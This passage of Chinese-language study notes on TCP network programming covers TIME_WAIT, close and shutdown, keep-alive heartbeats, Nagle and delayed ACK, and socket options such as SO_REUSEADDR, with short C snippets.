的确认分组</p></li><li><p>cksum：校验码</p></li><li><p>win：滑动窗口大小</p></li><li><p>length：载荷的长度</p></li></ul></li></ul><p>​</p><p>​</p><h2 id="02-网络编程进阶">02 | 网络编程进阶</h2><h3 id="TIME-WAIT">TIME_WAIT</h3><ul><li>场景引入：应用服务需要通过发起 TCP 连接对外提供服务，在高并发情况下，TIME_WAIT 状态的连接过多，把本机可用的端口耗尽，应用服务对外表现为不能正常工作，一段时间后处于 TIME_WAIT 的连接被系统回收并关闭后，释放出本地端口，应用服务对外表现为可以正常工作</li></ul><h4 id="TCP-四次挥手">TCP 四次挥手</h4><ul><li><p>TCP 四次挥手过程</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220506-four-time-wave.png" alt=""></p><ul><li>主动关闭方 TCP 发送 FIN 包，表示需要关闭连接，之后主动关闭方进入 FIN_WAIT_1 状态</li><li>收到 FIN 包的对端执行被动关闭，进入 <code>CLOSE_WAIT</code> 状态，并发送一个 ACK 应答<ul><li>TCP 协议栈为 FIN 包插入一个文件结束符 EOF 到接收缓冲区中，应用程序可以通过 read 调用来感知这个 FIN 包</li></ul></li><li>read 调用获得 EOF，并将此结果通知应用程序调用 close 关闭它的套接字，也发送一个 FIN 包，被动关闭方将进入 <code>LAST_ACK</code> 状态</li><li>主动关闭方接收到对方的 FIN 包，并确认这个 FIN 包，主动关闭方进入 <code>TIME_WAIT</code> 状态，而接收到 ACK 的被动关闭方则进入 <code>CLOSED</code> 状态</li><li>经过 2MSL 时间之后，主动关闭方也进入 <code>CLOSED</code> 状态</li><li>注意：<ul><li><strong>只有发起连接终止的一方会进入 TIME_WAIT 状态</strong></li><li>使用 <a href="#shutdown">shutdown</a>，执行一端到另一端的半关闭也是可以的</li></ul></li></ul></li><li><p>大多数真实情况是客户端执行主动关闭，HTTP/1.0 却是由服务器发起主动关闭的</p></li><li><p>主机在 TIME_WAIT 停留持续时间是固定的，是最长分节生命期 MSL（maximum segment lifetime）的两倍，一般称之为 2MSL，时间是从主机 1 接收到 FIN 后发送 ACK 开始计时的，如果在 TIME_WAIT 时间内又接收到了主机 2 重发的 FIN 报文，那么 2MSL 时间将重新计时（目的是为了让旧连接的所有报文都能自然消亡）</p></li><li><p>Linux 里有一个硬编码的字段 <code>TCP_TIMEWAIT_LEN</code> 值为 60 秒，Linux 停留在 TIME_WAIT 的时间为固定的 60 秒</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">TCP_TIMEWAIT_LEN</span> <span class="token punctuation">(</span><span class="token number">60</span><span class="token operator">*</span>HZ<span class="token punctuation">)</span> </span><span class="token comment">/* how long to wait to destroy TIME-        WAIT state, about 60 seconds*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>​</p><p>​</p><h4 id="TIME-WAIT-的作用">TIME_WAIT 的作用</h4><ul><li><p><strong>为了确保最后的 ACK 能让被动关闭方接收从而帮助其正常关闭</strong></p><ul><li>比如主机 1 的 ACK 报文没有传输成功，那么主机 2 就会重新发送 FIN 报文，处于 TIME_WAIT 状态的主机 1 可以在接收到 FIN 报文之后，重新发出一个 ACK 报文</li><li>如果没有维护 TIME_WAIT 状态，而直接进入 CLOSED 状态，它就失去了当前状态的上下文，只能回复一个 RST 操作，从而导致被动关闭方出现错误</li></ul></li><li><p><strong>为了让旧连接的重复分节在网络中自然消失</strong></p><ul><li>如果迷走报文到达时，发现 TCP 连接四元组所代表的连接不存在，报文自然丢弃，但在原连接中断后，可能又重新创建了一个和原连接四元组完全相同的“化身”，到达的迷走报文会被误认为是连接“化身”的一个 TCP 分节，就会对 TCP 通信产生影响</li><li>经过 2MSL 时间足以让两个方向上的分组都被丢弃，使得原来连接的分组在网络中都自然消失，再出现的分组都是新化身所产生的</li></ul></li></ul><p>​</p><p>​</p><h4 id="TIME-WAIT-的危害">TIME_WAIT 的危害</h4><ul><li><p>内存资源占用，但不是太严重，基本可以忽略</p></li><li><p>端口资源占用，一个 TCP 连接至少消耗一个本地端口，一般可以开启的端口为 32768～61000 ，也可通过 <code>net.ipv4.ip_local_port_range</code> 指定，如果 TIME_WAIT 状态过多，会导致无法创建新连接</p></li></ul><h4 id="如何优化">如何优化</h4><ul><li><p>net.ipv4.tcp_max_tw_buckets（不推荐使用）</p><ul><li>值默认为 18000</li><li>通过 sysctl 命令将系统值调小，当系统中处于 TIME_WAIT 的连接一旦超过这个值时，系统就会将所有的 TIME_WAIT 连接状态重置，并且只打印出警告信息，但是这个方法暴力且治标不治本</li></ul></li><li><p>调低 <code>TCP_TIMEWAIT_LEN</code>，重新编译系统</p></li><li><p><code>SO_LINGER</code> 设置（危险行为，不提倡）</p><ul><li><p>通过设置套接字选项，来设置调用 close 或者 shutdown 关闭连接时的行为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">setsockopt</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">int</span> level<span class="token punctuation">,</span> <span class="token keyword">int</span> optname<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>optval<span class="token punctuation">,</span> socklen_t optlen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">-</span><span class="token keyword">struct</span> <span class="token class-name">linger</span> <span class="token punctuation">{</span>　<span class="token keyword">int</span>　 l_onoff<span class="token punctuation">;</span>　　　　<span class="token comment">/* 0=off, nonzero=on */</span>　<span class="token keyword">int</span>　 l_linger<span class="token punctuation">;</span>　　　　<span class="token comment">/* linger time, POSIX specifies units as seconds */</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果<code>l_onoff</code>为 0，那么关闭本选项，<code>l_linger</code>的值被忽略</p><ul><li>对应了默认行为，close 或 shutdown 立即返回</li><li>如果在套接字发送缓冲区中有数据残留，系统会将试着把这些数据发送出去</li></ul></li><li><p>如果<code>l_onoff</code>不为 0， 且<code>l_linger</code>值也为 0</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">linger</span> so_linger<span class="token punctuation">;</span>so_linger<span class="token punctuation">.</span>l_onoff <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>so_linger<span class="token punctuation">.</span>l_linger <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>SOL_SOCKET<span class="token punctuation">,</span>SO_LINGER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>so_linger<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>so_linger<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>调用 close 后，会立该发送一个 RST 给对端，该 TCP 连接将<strong>跳过四次挥手</strong>直接关闭，这种关闭的方式称为强行关闭</p></li><li><p>在这种情况下，排队数据不会被发送，被动关闭方也不知道对端已经彻底断开，只有当被动关闭方接受到 RST 时，会得到一个 connet reset by peer 异常</p></li></ul></li><li><p>如果<code>l_onoff</code>不为 0， 且<code>l_linger</code>的值也不为 0，那么调用 close 后，调用 close 的线程就将阻塞，直到数据被发送出去，或者设置的<code>l_linger</code>计时时间到</p></li></ul></li><li><p><code>net.ipv4.tcp_tw_reuse</code>：更安全的设置</p><ul><li><p><strong>从协议角度理解如果是安全可控的</strong>，可以<strong>复用</strong>处于 TIME_WAIT 的套接字为新的连接所用</p></li><li><p>从协议角度理解的安全可控：</p><ul><li>只适用于连接发起方（C/S 模型中的客户端）</li><li>对应的 TIME_WAIT 状态的连接创建时间超过 1 秒才可以被复用</li></ul></li><li><p>前提：需要打开对 TCP 时间戳的支持，即 <code>net.ipv4.tcp_timestamps=1</code>（默认即为 1）</p><ul><li>RFC 1323 中实现了 TCP 拓展规范，以便保证 TCP 的高可用，并引入了新的 TCP 选项，两个 4 字节的时间戳字段，用于记录 TCP 发送方的当前时间戳和从对端接收到的最新时间戳</li><li>由于引入了时间戳，重复数据包会因为时间戳过期被自然丢弃</li></ul></li><li><p>注意：要慎用，因为打开了时间戳的支持，当客户端与服务端主机时间不同步时，客户端的发送的消息会被直接拒绝</p></li></ul></li></ul><p>​</p><p>​</p><h3 id="优雅关闭连接">优雅关闭连接</h3><ul><li>服务器端优雅地关闭连接：绝大数情况下，TCP 连接都是先关闭一个方向，此时另一个方向还可以正常进行数据传输，服务端完成一些操作并将结果通过套接字写给客户端后，才有条不紊地关闭剩下的半个连接</li><li>如果服务器端处理不好，就会导致最后的关闭过程是粗暴的，可能服务器端处理完的信息没办法正常传送给客户端，破坏了用户侧的使用场景</li></ul><p>​</p><p>​</p><h4 id="close">close</h4><ul><li><p>函数原型：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>若成功则为 0，若出错则为 -1</li><li>函数会对<strong>套接字引用计数</strong> -1，一旦发现套接字引用计数到 0，就会对套接字进行彻底释放，并且会关闭<strong>TCP 两个方向的数据流</strong><ul><li>套接字引用计数：因为套接字可以被多个进程共享，如果通过 fork 的方式产生子进程，计数 +1， 如果调用一次 close 函数，计数 -1</li></ul></li></ul></li><li><p>close 函数是如何关闭两个方向的数据流呢？</p><ul><li>在输入方向，系统内核会将该套接字设置为不可读，任何读操作都会返回异常</li><li>在输出方向，系统内核尝试将发送缓冲区的数据发送给对端，并最后向对端发送一个 FIN 报文，接下来如果再对该套接字进行写操作会返回异常</li><li>如果对端没有检测到套接字已关闭，还继续发送报文，就会收到一个 RST 报文</li></ul></li><li><p>close 函数并不能关闭连接的一个方向</p></li></ul><p>​</p><p>​</p><h4 id="shutdown">shutdown</h4><ul><li><p>函数原型：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">int</span> howto<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>若成功则为 0，若出错则为 -1</p></li><li><p><code>howto</code> 的设置有三个主要选项：</p><ul><li><p><code>SHUT_RD(0)</code>：关闭连接的读方向，对该套接字进行读操作直接返回 EOF，从数据角度来看，套接字上接收缓冲区已有的数据将被丢弃，如果再有新的数据流到达，会对数据进行 ACK，然后悄悄地丢弃</p></li><li><p><code>SHUT_WR(1)</code>：关闭连接的写方向（不管套接字引用计数的值是多少），这就是常被称为<strong>半关闭</strong>的连接，套接字上发送缓冲区已有的数据将被立即发送出去，并发送一个 FIN 报文给对端，应用程序如果对该套接字进行写操作会报错</p></li><li><p><code>SHUT_RDWR(2)</code>：相当于 SHUT_RD 和 SHUT_WR 操作各一次，关闭套接字的读和写两个方向</p></li></ul></li></ul></li><li><p>使用 <code>SHUT_RDWR</code> 来调用 shutdown 和 close 的差别</p><ul><li><p>close 会关闭连接，并释放所有连接对应的资源，而 shutdown 并不会释放掉套接字和所有的资源</p></li><li><p>close 存在引用计数的概念，并不一定导致该套接字不可用；shutdown 则不管引用计数，直接使得该套接字不可用，如果有别的进程企图使用该套接字，将会受到影响</p></li><li><p>close 的引用计数导致不一定会发出 FIN 结束报文，而 shutdown 则总是会发出 FIN 结束报文</p></li></ul></li></ul><p>​</p><h4 id="实验-3">实验</h4><ul><li><p>客户端程序，从标准输入不断接收用户输入，把输入的字符串通过套接字发送给服务器端，同时将服务器端的应答显示到标准输出上</p><p>如果用户输入了 close，则会调用 close 函数关闭连接，休眠一段时间，等待服务器端处理后退出；如果用户输入了 shutdown，调用 shutdown 函数关闭连接的写方向，并继续等待服务器端的应答，直到服务器端完成自己的操作，在另一个方向上完成关闭</p></li><li><p>服务端打印出接收的字节，并重新格式化后，发送给客户端</p></li><li><p>运行</p><ul><li><p>close</p><p><img src="20220508-171352.png" alt=""></p><ul><li><p>客户端依次发送了 data1 和 data2，服务器端也正常接收到 data1 和 data2，在客户端 close 掉整个连接之后，服务器端接收到 SIGPIPE 信号，直接退出，客户端没有收到服务端的应答数据</p></li><li><p>在 RST 的套接字进行写操作，会直接触发 SIGPIPE 信号</p></li><li><p>可以注册一个信号处理函数对 SIGPIPE 信号进行处理，避免程序莫名退出</p></li></ul><p><img src="20220508-170216.png" alt=""></p></li><li><p>shutdown</p><p><img src="20220508-172244.png" alt=""></p><ul><li><p>客户端和服务器端各自完成了自己的工作后，正常退出</p></li><li><p>客户端调用 shutdown 函数只是关闭连接的一个方向，服务器端到客户端的这个方向还可以继续进行数据的发送和接收</p></li><li><p>当服务器端读到 EOF 时，立即向客户端发送了 FIN 报文，客户端在 read 函数中感知了 EOF，也进行了正常退出</p></li></ul></li><li><p>时序图</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220508-close-and-shutdown.png" alt=""></p></li></ul></li></ul><p>​</p><h3 id="检测连接状态">检测连接状态</h3><h4 id="TCP-Keep-Alive">TCP Keep-Alive</h4><ul><li><p>客户端突然崩溃，服务器端可能在几天内都维护着一个无用的 TCP 连接</p></li><li><p>TCP 有一个保持活跃的机制 <strong>Keep-Alive</strong></p><ul><li><p>原理：定义一个时间段，在这个时间段内如果没有任何连接相关的活动，TCP 保活机制就会每隔一个时间间隔，发送一个探测报文，如果连续几个探测报文都没有得到响应，则认为当前的 TCP 连接已经死亡，系统内核将错误信息通知给上层应用程序</p></li><li><p>上述可定义变量分别被称为<strong>保活时间、保活时间间隔和保活探测次数</strong></p></li><li><p>在 Linux 中这些变量分别对应 sysctl 变量 <code>net.ipv4.tcp_keepalive_time</code>、<code>net.ipv4.tcp_keepalive_intvl</code>、<code>net.ipv4.tcp_keepalve_probes</code></p><ul><li>默认设置是 7200 秒（2 小时）、75 秒和 9 次探测</li><li>最少需要经过 2 小时 11 分 15 秒才可以发现一个已死亡的连接，对很多对时延要求敏感的系统中，这个时间间隔是不可接受的</li></ul></li><li><p>TCP Keep-Alive 机制默认是关闭的，可以分别在连接的两个方向上开启，也可以单独在一个方向上开启</p><ul><li>如果开启服务器端到客户端的检测，就可以在客户端非正常断连的情况下清除在服务器端保留的“脏数据”；</li><li>开启客户端到服务器端的检测，就可以在服务器无响应的情况下，重新发起连接</li></ul></li></ul></li><li><p>如果开启了 TCP Keep-Alive，需要考虑以下情况：</p><ul><li>对端程序是正常工作的：当 TCP 保活的探测报文发送给对端，对端会正常响应，这样 TCP 保活时间会被重置，等待下一个 TCP 保活时间的到来</li><li>对端程序崩溃并重启：当 TCP 保活的探测报文发送给对端后，对端是可以响应的，但由于没有该连接的有效信息，会产生一个 RST 报文，这样很快就会发现 TCP 连接已经被重置</li><li>对端程序崩溃，或对端由于其他原因导致报文不可达：当 TCP 保活的探测报文发送给对端后，没有响应，连续几次，达到保活探测次数后，TCP 会报告该 TCP 连接已经死亡</li></ul></li></ul><p>​</p><p>​</p><h4 id="应用层探活">应用层探活</h4><ul><li>可以在应用程序中<strong>模拟</strong> TCP Keep-Alive 机制来完成在应用层的连接探活</li><li>可以设计一个 PING-PONG 的机制，需要保活的一方在保活时间达到后，发起对连接的 PING 操作，如果服务器端对 PING 操作有回应，则重新设置保活时间，否则对探测次数进行计数，如果最终探测次数达到了保活探测次数预先设置的值之后，则认为连接已经无效</li></ul><h5 id="示例">示例</h5><blockquote><p>完成一个这样的设计，关键：</p><ol><li>需要使用定时器，可以通过使用 I/O 复用自身的机制实现</li><li>需要设计一个 PING-PONG 的协议</li></ol></blockquote><ul><li><p>消息格式设计</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    u_int32_t type<span class="token punctuation">;</span>    <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> messageObject<span class="token punctuation">;</span> <span class="token comment">// 四种消息类型</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">MSG_PING          <span class="token number">1</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">MSG_PONG          <span class="token number">2</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">MSG_TYPE1        <span class="token number">11</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">MSG_TYPE2        <span class="token number">21</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>客户端程序设计：在保活时间达到后，探活次数增加 1，同时向服务器端发送 PING 格式的消息，此后以预设的保活时间间隔，不断地向服务器端发送 PING 格式的消息，如果能收到服务器端的应答，则结束保活，将保活时间置为 0</p></li><li><p>服务器端程序设计：接收客户端发送来的各种消息后，进行处理，其中如果发现是 PING 类型的消息，在休眠一段时间后回复一个 PONG 消息</p></li></ul><h5 id="实验-4">实验</h5><ul><li><p>服务器端休眠时间为 60 秒：客户端在发送了三次心跳检测报文 PING 报文后，判断出连接无效，直接退出</p><p><img src="20220511-001036.png" alt=""></p></li><li><p>服务器端休眠时间为 5 秒</p><p><img src="20220511-001221.png" alt=""></p></li></ul><h3 id="TCP-动态数据传输">TCP 动态数据传输</h3><ul><li>在任何一个时刻里，TCP 发送缓冲区的数据是否能真正发送出去，决定的因素有发送窗口大小、拥塞窗口大小等</li></ul><p>​</p><p>​</p><h4 id="流量控制">流量控制</h4><ul><li><p>TCP 为应用程序提供了流量控制服务（flow control service）以消除发送方使接收方缓存溢岀的可能性，流量控制因此是一个速度匹配服务，即发送方的发送速率与接收方应用程序的读取速率相匹配</p></li><li><p><strong>发送窗口用来控制发送和接收端的流量</strong></p></li><li><p>发送窗口和接收窗口的本质：TCP 的生产者 - 消费者”模型，发送窗口和接收窗口是 TCP 连接的双方，一个作为生产者，一个作为消费者，为了达到一致协同的生产 - 消费速率、而产生的算法模型实现</p></li></ul><p>​</p><p>​</p><h4 id="拥塞控制">拥塞控制</h4><ul><li><p>流量控制只是在考虑单个连接的数据传递，但是 TCP 数据包需要经过网卡、交换机、核心路由器等一系列网络设备，设备本身的能力也是有限的，当多个连接的数据包同时在网络上传送时，势必会发生带宽争抢、数据丢失等，TCP 必须考虑<strong>多个连接共享在有限的带宽上，兼顾效率和公平性的控制</strong>，这就是拥塞控制的本质</p></li><li><p>在 TCP 协议中，拥塞控制是通过拥塞窗口来完成的，拥塞窗口的大小会随着网络状况实时调整</p></li><li><p>拥塞控制常用的算法有<strong>慢启动</strong>，通过一定的规则慢慢地将网络发送数据的速率增加到一个阈值，超过阈值后，进入<strong>拥塞避免</strong>阶段，这个阶段 TCP 会不断地探测网络状况，并随之不断调整拥塞窗口的大小</p></li><li><p>发送窗口反应了作为单 TCP 连接、点对点之间的流量控制模型，它是需要和接收端一起共同协调来调整大小的；而拥塞窗口则是反应了作为多个 TCP 连接共享带宽的拥塞控制模型，它是发送端独立地根据网络状况来动态调整的</p></li></ul><p>​</p><p>​</p><h4 id="其他因素">其他因素</h4><h5 id="Silly-Window-Syndrome">Silly Window Syndrome</h5><ul><li>场景：接收端处理得急不可待，如刚读入 100 个字节就告诉发送端继续发送，这种场景也被叫做糊涂窗口综合症</li><li>在接收端进行优化，接收端不能在接收缓冲区空出一个很小的部分之后，就向发送端发送窗口更新通知，而是需要在自己的缓冲区大到一个合理的值之后，再向发送端发送窗口更新通知</li></ul><p>​</p><p>​</p><h5 id="Small-Packet-Problem">Small Packet Problem</h5><ul><li><p>场景：在使用一些协议通讯时（如 Telnet），会有一个字节发送的情景，每次发送一个字节的有用数据，就会产生 41 个字节长的分组、20 字节的 IP Header 和 20 字节的 TCP Header，导致 1 个字节的有用信息要浪费掉 40 字节的头部信息，开销大，且会增加拥塞的出现</p></li><li><p>在发送端进行优化，优化的算法叫做 <code>Nagle</code> 算法，通过减少需要通过网络发送包的数量来提高 TCP/IP 传输的效率</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> there is new data to send  <span class="token keyword">if</span> the window size <span class="token operator">&gt;=</span> MSS and available data is <span class="token operator">&gt;=</span> MSS    send complete MSS segment now <span class="token comment">// 对于MSS的片段直接发送</span>  <span class="token keyword">else</span>    <span class="token keyword">if</span> there is unconfirmed data still in the pipe      <span class="token comment">// 如果有没有被确认的data在缓冲区内</span>      <span class="token comment">// 将待发送的数据放到buffer中直到被发送的数据被确认</span>      enqueue data in the buffer until an acknowledge is received    <span class="token keyword">else</span>      send data immediately    end <span class="token keyword">if</span>  end <span class="token keyword">if</span>end i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>Nagle</code> 算法的本质其实就是<strong>限制大批量的小数据包同时发送</strong>，在任何一个时刻，未被确认的小数据包（长度小于最大报文段长度 MSS 的 TCP 分组）不能超过一个，这样发送端就可以把接下来连续的几个小数据包存储起来，等待接收到前一个小数据包的 ACK 分组之后，再将数据一次性发送出去</p></li></ul><p>​</p><p>​</p><h5 id="Delay-ACK">Delay ACK</h5><ul><li>场景：接收端需要对每个接收到的 TCP 分组进行确认，但是 ACK 报文本身是不带数据的分段，如果一直发送大量的 ACK 报文，就会消耗大量的带宽</li><li>在接收端进行优化，这个优化的算法叫做<strong>延时 ACK</strong>，在收到数据后并不马上回复，而是累计需要发送的 ACK 报文，等到有数据需要发送给对端时，将累计的 ACK 一并发送</li><li>延时 ACK 机制不能无限地延时下去，否则发送端误认为数据包没有发送成功，引起重传，反而会占用额外的网络带宽</li></ul><p>​</p><p>​</p><h5 id="Delay-ACK-and-Nagle">Delay ACK and Nagle</h5><ul><li><p>Nagle 算法和延时 ACK 的组合，会增大处理时延，两个优化彼此在阻止对方，在有些情况下 Nagle 算法并不适用， 比如对时延敏感的应用</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220511-delayack-nagle.png" style="zoom: 67%;"></li><li><p>可以通过对套接字的修改来关闭 Nagle 算法</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> on <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token function">setsockopt</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> IPPROTO_TCP<span class="token punctuation">,</span> TCP_NODELAY<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>on<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>on<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>注意</strong>：除非有十足的把握，否则不要轻易改变默认的 TCP Nagle 算法，因为在现代操作系统中，针对 Nagle 算法和延时 ACK 的优化已经非常成熟了，有可能在禁用 Nagle 算法之后，性能问题反而更加严重</p></li></ul><p>​</p><p>​</p><h5 id="Gather-Write">Gather Write</h5><ul><li><p>如果能将一个请求一次性发送过去，而不是分开两部分独立发送，结果会好很多，可以在写数据之前，将数据合并到缓冲区再批量发送</p></li><li><p>可使用如下方法进行数据读写操作，从而避免 Nagle 算法引发的副作用</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token punctuation">{</span><span class="token keyword">void</span> <span class="token operator">*</span>iov_base<span class="token punctuation">;</span> <span class="token comment">/* starting address of buffer */</span>size_t　iov_len<span class="token punctuation">;</span> <span class="token comment">/* size of buffer */</span><span class="token punctuation">}</span><span class="token punctuation">;</span>ssize_t <span class="token function">writev</span><span class="token punctuation">(</span><span class="token keyword">int</span> filedes<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span>iov<span class="token punctuation">,</span> <span class="token keyword">int</span> iovcnt<span class="token punctuation">)</span>ssize_t <span class="token function">readv</span><span class="token punctuation">(</span><span class="token keyword">int</span> filedes<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span>iov<span class="token punctuation">,</span> <span class="token keyword">int</span> iovcnt<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>实验</p><p><img src="20220515-003659.png" alt=""></p></li></ul><p>​</p><p>​</p><h3 id="快速重启">快速重启</h3><ul><li><p>通过服务器端发起的关闭连接操作会引起一个已有的 TCP 连接处于 TME_WAIT 状态，服务器重启时绑定地址和端口的操作会返回 <strong>Address already in use</strong> 错误</p><p><img src="20220518-190208.png" alt=""></p><p><img src="20220518-190039.png" alt=""></p></li></ul><p>​</p><p>​</p><h4 id="重用套接字选项">重用套接字选项</h4><ul><li><p>一个 TCP 连接是通过四元组来唯一确定的，如果每次客户端使用的本地端口都不同，就不会和已有的四元组冲突，也就不会有 TIME_WAIT 的新旧连接化身冲突的问题</p></li><li><p>如果新旧连接的四元组相同，现代 Linux 操作系统对此进行了优化，一个 TIME_WAIT 的 TCP 连接可以忽略掉旧连接，重新被新的连接所使用，这就是重用套接字选项</p><ul><li><p>新连接 SYN 告知的初始序列号，一定比 TIME_WAIT 老连接的末序列号大，这样通过序列号就可以区别出新老连接</p></li><li><p>开启了 <code>tcp_timestamps</code> 使得新连接的时间戳比老连接的时间戳大，这样通过时间戳也可以区别出新老连接</p></li></ul></li><li><p><code>SO_REUSEADDR</code> 套接字选项，允许启动绑定在一个端口，即使之前存在一个和该端口一样的连接，本机如果有多个地址，配置<code>SO_REUSEADDR</code> 选项可以在不同地址上使用相同的端口提供服务</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> on <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span> SOL_SOCKET<span class="token punctuation">,</span> SO_REUSEADDR<span class="token punctuation">,</span> <span class="token operator">&amp;</span>on<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>on<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>TCP 的机制不允许在相同的地址和端口上绑定不同的服务器，即使设置 <code>SO_REUSEADDR</code> 套接字选项，也不可能在相同的地址和端口上重复启动两个服务器实例</p></blockquote></li><li><p><code>SO_REUSEADDR</code> 和 [tcp_tw_reuse](#如何优化 TIME_WAIT) 没有关系</p><ul><li><code>tcp_tw_reuse</code> 是内核选项，主要用在<strong>连接的发起方</strong>，为了缩短 TIME_WAIT 的时间，避免系统资源占用，解决的是 accept 后的问题</li><li><code>SO_REUSEADDR</code> 是用户态的选项，一般是<strong>连接的服务方</strong>，如果端口已被占用，但是 TCP 连接状态位于 TIME_WAIT 可以重用端口，解决 TIME_WAIT 状态带来的端口占用问题，解决的是 bind 时的问题；如果端口忙，而 TCP 处于其他状态，重用端口时依旧得到 <strong>Address already in use</strong> 的错误信息</li></ul></li></ul><p>​</p><p>​</p><h4 id="最佳实践">最佳实践</h4><ul><li>服务器端程序，都应该设置 <code>SO_REUSEADDR</code> 套接字选项，以便服务端程序可以在极短时间内复用同一个端口启动</li></ul><p>​</p><p>​</p><h3 id="如何理解-TCP-流">如何理解 TCP 流</h3><ul><li>TCP 是一种流式协议，<strong>字节流本身是没有边界的</strong></li><li>数据什么时候真正被发送取决于发送窗口、拥塞窗口以及当前发送缓冲区的大小等条件，不能假设每次 send 调用发送的数据，都会作为一个整体完整地被发送出去</li><li>接收端缓冲区保留了没有被取走的数据，随着应用程序不断从接收端缓冲区读出数据，接收端缓冲区就可以容纳更多新的数据</li></ul><p>​</p><p>​</p><h4 id="网络字节排序">网络字节排序</h4><ul><li><p>高字节存放在起始地址叫做<strong>大端字节序</strong>（Big-Endian），低字节存放在起始地址叫做<strong>小端字节序</strong>（Little-Endian）</p></li><li><p>为保证网络字节序一致，POSIX 标准提供了转换函数在主机和网络的格式之间灵活转换</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">uint16_t <span class="token function">htons</span> <span class="token punctuation">(</span>uint16_t hostshort<span class="token punctuation">)</span>uint16_t <span class="token function">ntohs</span> <span class="token punctuation">(</span>uint16_t netshort<span class="token punctuation">)</span>uint32_t <span class="token function">htonl</span> <span class="token punctuation">(</span>uint32_t hostlong<span class="token punctuation">)</span>uint32_t <span class="token function">ntohl</span> <span class="token punctuation">(</span>uint32_t netlong<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>s 表示 short，l 表示 long，分别表示 16 位和 32 位的整数</li><li>如果系统和网络字节序一样，那么使用上述所有的函数进行转换的时候，结果都仅仅是一个空实现，直接返回</li></ul></li></ul><p>​</p><p>​</p><h4 